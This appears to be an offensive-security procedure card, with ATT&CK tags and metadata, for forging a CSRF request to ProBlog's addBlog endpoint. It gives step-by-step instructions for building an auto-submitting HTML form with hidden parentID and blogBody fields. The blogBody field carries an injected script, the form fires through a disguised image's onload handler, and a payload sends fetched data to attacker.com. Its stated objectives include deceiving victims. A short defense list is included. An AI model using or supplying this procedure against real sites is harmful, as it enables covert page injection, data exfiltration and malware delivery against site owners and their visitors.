---
tags:
  - csrf
  - payload-crafting
  - javascript-injection
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:03.253Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 8071778b-b3d8-4843-8b61-b018fefccdd8
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-CSRF-Form-for-Page-Creation

## Summary

This procedure crafts an HTML form exploiting the CSRF vulnerability in ProBlog's addBlog endpoint, using an arbitrary parentID and injecting a JavaScript payload into the blogBody to create malicious pages for data exfiltration or malware deployment.

## Description

The form targets the vulnerable POST endpoint, bypassing validation by setting parentID to an extracted CCM_CID (not restricted to blog sections) and embedding JS in blogBody. Disguised as a link or image, it submits automatically upon victim interaction. Prerequisites: Extracted CCM_CIDs and knowledge of the endpoint URL. Outcomes: A deliverable payload that creates exploitable pages site-wide.

## Requirements

1. Extracted CCM_CID values for parentID
2. Target endpoint URL (e.g., /index.php/tools/problog/addBlog)
3. JavaScript payload for the attack (e.g., exfil to attacker server)

## Defense

Defensive measures and detection strategies:

- Validate parentID against allowed sections only
- Sanitize and escape blogBody to prevent JS injection
- Enable strict referrer checks or SameSite cookies

## Objectives

1. Forge a request to create a page under any parent
2. Inject executable JavaScript for persistence
3. Deceive victim into submission without suspicion

## Instructions

### Step 1: Define Form Parameters

**Context**: Set up the form with vulnerable parameters.

Create an HTML form: action="/index.php/tools/problog/addBlog", method="POST". Include hidden inputs: <input type="hidden" name="parentID" value="[extracted_CCM_CID]" /> and <input type="hidden" name="blogBody" value="<script>malicious JS payload</script>" />.

> Ensure payload is URL-encoded if needed; e.g., JS for fetching /data and sending to attacker.com.

### Step 2: Disguise and Auto-Submit

**Context**: Make it trigger on load or click.

Wrap in a div styled as an image: <img src="benign.jpg" onload="this.parentNode.submit();" /> or use onclick for links.

> Test locally: Load in browser targeting a test site to verify submission.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[csrf]]
- [[js-injection]]
